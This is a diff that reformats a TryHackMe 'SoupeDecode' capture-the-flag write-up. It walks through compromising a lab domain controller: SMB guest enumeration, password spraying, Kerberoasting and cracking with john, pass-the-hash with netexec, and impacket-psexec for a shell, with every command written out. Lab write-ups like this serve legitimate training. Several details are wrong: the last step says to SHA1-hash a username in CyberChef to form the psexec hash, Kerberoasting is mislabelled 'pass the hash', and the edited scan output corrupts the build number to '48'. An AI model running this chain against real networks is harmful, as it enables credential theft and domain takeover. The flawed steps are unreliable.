@@ -1,31 +1,32 @@
-So this is the SoupeDecode challenge on TryHackMe.
+# SoupeDecode Challenge on TryHackMe
 
+You can find it inside the TryHackMe easy difficulty room.
 
-u can find it inside the tryhackme easy difficulty room.
+## Challenge Description
 
+> Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.
 
-so let s begin by taking a look at the challenge description.
+This is kinda of a challenge about domain controllers and kerberos authentication, SMB shares and everythings.
 
+## Nmap Scan
 
-# Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.#
+First, we gonna do a nmap scan to see what ports are open on the target machine.  
+By the way, all the tools you gonna use here are already pre-installed inside a Kali Linux machine or Parrot OS.
 
-so this is kinda of a challenge about domain controllers and kerberos authentication.smb shares and everythings
+```bash
+nmap -sC -sV -p- -T4 --min-rate=1000 -oN nmap/allports.txt
+```
 
-so first we gonna do a nmap scan to see what ports are open on the target machine.
-by the way all the tools u gonna use here is already pre installed inside a kali linux machine.or a parrot os machine.
+- `-sC` for default script
+- `-sV` for version detection
+- `-p-` for all ports
+- `-T4` for faster scan
+- `--min-rate=1000` for minimum rate of 1000 packets per second
+- `-oN` for output in normal format
 
+We got the response from nmap:
 
-using = nmap -sC -sV -p- -T4 --min-rate=1000 -oN nmap/allports.txt
-so the flag -sC for default script
-*the flag -sV for version detection
-*the flag -p- for all ports
-*the flag -T4 for faster scan
-*the flag --min-rate=1000 for minimum rate of 1000 packets per second
-*the flag -oN for output in normal format
-
-
-we got the response from nmap 
-#
+```
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-04 11:44:47Z)
@@ -58,26 +59,25 @@ PORT      STATE SERVICE       VERSION
 49713/tcp open  msrpc         Microsoft Windows RPC
 49719/tcp open  msrpc         Microsoft Windows RPC
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
-#
+```
 
 
 
 
-okay so here we have a bunch of open port the first thinks i m gonna do is trying to enemurate the SMB and to see if the guest account is enabled or not because if the guest account is enabled we can use it to access the SMB shares and maybe find some useful information there.
+Okay, so here we have a bunch of open ports. The first thing I'm gonna do is try to enumerate the SMB and see if the guest account is enabled or not, because if the guest account is enabled, we can use it to access the SMB shares and maybe find some useful information there.
 
+**There is one way with Metasploit using the lookupsid module where we give the RHOSTS the guest SMB user and let it treat it. You just navigate in Metasploit and see it.**
 
-**there are one way with metasploit using the lookupsid module where we give the  RHOSTS the guest smbUser and let it treat it
-u just navigate in metasploit and see it 
+**And another way using NetExec where we can use the smbclient to connect to the SMB shares and see if we can access them with the guest account.**
 
- 
-**and another way using nxcat where we can use the smbclient to connect to the smb shares and see if we can access them with the guest account.
+```bash
+nxc smb \\<IP_ADDRESS> -u "guest" -p "" --shares
+```
 
+Output:
 
-command : nxc smb \\<IP_ADDRESS>\ -u "guest" -p "" --shares
-
-#
-output:
-SMB         10.67.184.231   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01)
+```
+SMB         10.67.184.231   445    DC01             [*] Windows Server 2022 Build 48 x64 (name:DC01)
 (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
 SMB         10.67.184.231   445    DC01             [+] SOUPEDECODE.LOCAL\guest:  
 SMB         10.67.184.231   445    DC01             [*] Enumerated shares
@@ -90,132 +90,136 @@ SMB         10.67.184.231   445    DC01             IPC$            READ        
 SMB         10.67.184.231   445    DC01             NETLOGON                        Logon server share
 SMB         10.67.184.231   445    DC01             SYSVOL                          Logon server share
 SMB         10.67.184.231   445    DC01             Users
-#
+```
 
-because the guest account is enabled we can access the smb shares and we can see that there are some interesting shares like backup and users and maybe we can find some useful information there.
-// there is backup which may be useful later
+Because the guest account is enabled, we can access the SMB shares and we can see that there are some interesting shares like backup and Users, and maybe we can find some useful information there.  
+// There is backup which may be useful later.
 
+I only have read access to the IPC$ share and nothing else, so Metasploit is kinda the better way to do it. So I take the lookupsid module and I give it the RHOSTS the guest SMB user and let it treat it and see if we can find some useful information there.
 
-i only have read access to the IPC$ share and nothing else so the metasploit is kinda the better way to do it so i take the lookupsid module and i give it the RHOSTS the guest smbUser and let it treat it and see if we can find some useful information there.
+It returned 1069 accounts.
 
-it returned 1069 accounts 
+So now we have a list of users that we can use to perform a password spraying attack to find valid credentials.
 
-so now we have a list of users that we can use to perform password spraying attack to find valid credentials.
+I used a Python script to only get the username from the input from Metasploit.
 
-i used a python script to only get the username from the input from metasploit
+Then with only the username:
 
-then with only the username:
+## So the objectif is to try out all the username with a password same as the username to see if we can find any valid credentials.
 
+```bash
+netexec smb \\<IP_ADDRESS> -u user.txt -p user1.txt --no-bruteforce | grep -v FAILURE
+```
 
-o
-## so the objectif is to try out all the username with a password same as the username to see if we can find any valid credentials.
+We got one that match: user = [USERNAME] password = [USERNAME] in SOUPEDECODE.LOCAL domain.  
+Using these credentials, we can try to access the SMB shares again to see if we can find any useful information there.
 
-command : netexec smb \\<IP_ADDRESS>\ -u user.txt -p user1.txt --no-bruteforce | grep -v FAILURE
+```bash
+smbclient -L \\<IP_ADDRESS> -U 'SOUPEDECODE.LOCAL\[USERNAME]'
+```
 
+When prompted for the password, we give [USERNAME].
 
-we got one that match  user = ybob317 password = ybob317 in SOUPEDECODE.LOCAL domain
-using this credentials we can try to access the smb shares again to see if we can find any useful information there.
+No shares really interesting, we have a share "Users" in there. We gonna try accessing it.
 
+```bash
+smbclient \\<IP_ADDRESS>\Users -U 'SOUPEDECODE.LOCAL\[USERNAME]'
+```
 
-command: smbclient -L /<IP_ADDRESS> -U 'SOUPEDECODE.LOCAL\ybob317'
-when prompted for the password we give ybob317
+When prompted for the password, we give [USERNAME].
 
-no shares really interesting we have a shares Users in there we gonna try accessing it
+We get inside and see the users we found. Going inside his folder, we can find the user.txt inside /desktop.
 
-command : smbclient -L //ip_address>/Users -U 'SOUPEDECODE.LOCAL\ybob317'
-when prompted for the password we give ybob317
-
-
-
-we get inside and see the users we found going inside his folder we can find the users.txt inside /desktop
-
-inside a share use command :  more user.txt  to print it
-and :q to quit the mode
-
-
-
-the next Step :
+Inside a share, use command: `more user.txt` to print it, and `:q` to quit the mode.
 
 
 
-using impacket-GetUserSPNS.py to enumerate the SPN to find any service account that we can use to perform pass the hash attack
+## The Next Step
 
+Using impacket-GetUserSPNS.py to enumerate the SPN to find any service account that we can use to perform pass the hash attack.
 
-command : impacket-GetUserSPNS SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip <IP_ADDRESS> -request
+```bash
+impacket-GetUserSPNS SOUPEDECODE.LOCAL/[USERNAME]:[USERNAME] -dc-ip <IP_ADDRESS> -request
+```
 
+We get a lot of hashes for a lot of services:
 
-we get a lot of hash for a lot of service
+- ftp/fileserver
+- fw/proxyserver
+- http/backupServer
+- http/Webserver
+- https/monitoringserver
 
-ftp/fileserver
-fw/proxyserver
-http/backupServer
-http/Webserver
-https/monitoringserver
+Putting all the files inside a text I named hash.txt.
 
-
-
-putting all the file inside a text i named hash.txt 
-
-like this as a exemple fileserver:SOUPDECODE.LOCAL$@aad3b435b51404eeaad3b435b51404ee:bbf7e5f4c2d6c6f4e8f4e8f4e8f4e8f4
+Like this as an example:  
+fileserver:SOUPDECODE.LOCAL$@aad3b435b51404eeaad3b435b51404ee:bbf7e5f4c2d6c6f4e8f4e8f4e8f4e8f4  
 proxyserver:SOUPDECODE.LOCAL$@aad3b435b514
 
+We use John to do some decryption.
 
+```bash
+john hash.txt -w=/usr/share/wordlists/rockyou.txt
+```
 
-we use john to do some decryption
-command :  john hash.txt -w=/usr/share/wordlists/rockyou.txt
-and we get one password for the file_svc
+And we get one password for the file_svc.
 
+We then reconnect to SMB.
 
+```bash
+smbclient -L \\<IP_ADDRESS> -U 'SOUPEDECODE.LOCAL\file_svc'
+```
 
-we then reconnect to smb
-command : smbclient -L //<IP_ADDRESS>/ -U 'SOUPEDECODE.LOCAL\file_svc'
-when prompted for the password
-and we see the share backup that we said earlier we have read access to it
+When prompted for the password, and we see the share backup that we said earlier we have read access to it.
 
+We reconnect using smbclient.
 
-we reconnect using smbclient
-command : smbclient //<IP_ADDRESS>/backup -U 'SOUPEDECODE.LOCAL\file_svc'
+```bash
+smbclient \\<IP_ADDRESS>\backup -U 'SOUPEDECODE.LOCAL\file_svc'
+```
 
-and we do a get command 
-command : get backup.extract.txt
+And we do a get command.
 
-we get a username:uid:hash type file so we have to get everythings alone the hash and the users
+```bash
+get backup.extract.txt
+```
 
-using this command 
+We get a username:uid:hash type file, so we have to get everything alone the hash and the users.
 
-command : cat backup.extract.txt | cut -d ':' -f 1 > backup.users.txt
+Using this command:
 
-and
+```bash
+cat backup.extract.txt | cut -d ':' -f 1 > backup.users.txt
+```
 
-command : cat backup.extract.txt | cut -d ':' -f 4 | awk '{print "00000000000000000000000000000000:"$1}' > backup.hashes. //some windows stuff
+And
 
-we do the same with netexec try to see if a username use the same ass password hashes 
-this is the pass the hash method
+```bash
+cat backup.extract.txt | cut -d ':' -f 4 | awk '{print "00000000000000000000000000000000:"$1}' > backup.hashes.txt  // some Windows stuff
+```
 
+We do the same with NetExec to try to see if a username uses the same as password hashes. This is the pass the hash method.
 
-netexec smb //ip adress -u backup.user.txt -H backup.hashes.txt
+```bash
+netexec smb \\<IP_ADDRESS> -u backup.user.txt -H backup.hashes.txt
+```
+
 -H = to pass a hash
 
+And we got a match, the FileServer matches one of the hashes.
 
-and we got a match the fileserver match one of the hash
+So we got a hash and a username. Right now, to use impacket-psexec, we have to transform the username to hash. Go to CyberChef and transform the username to hash using SHA1.
 
-
-so we got a hash and a username right now to use impacket-psexec we have to transform the username to hash go to cyberchef and transform the username to hash using sha1
-
-
-exemple : 
-username = SOUPEDECODE.LOCAL\FileServer$
+Example:  
+username = SOUPEDECODE.LOCAL\FileServer$  
 password = some hash
 
+Send the username to CyberChef and try the impacket command here.
 
-send the username to cyberchef and try the impacket command here
+```bash
+impacket-psexec 'FileServer$@<IP_ADDRESS>' -hashes 'hash_of_the_username:password_hash_that_match'
+```
 
-
-
-command = impacket-psexec 'FileServer$@/ipadress' -hashes 'hash_of_the_username:password_hash_that_match'
-
-and we get inside seing a little windows terminale we navigate throug ../../Users/Administrators/Desktop
-and we got the root.txt
-
+And we get inside, seeing a little Windows terminal. We navigate through ../../Users/Administrators/Desktop and we got the root.txt.
 
 Congrat!!!!!
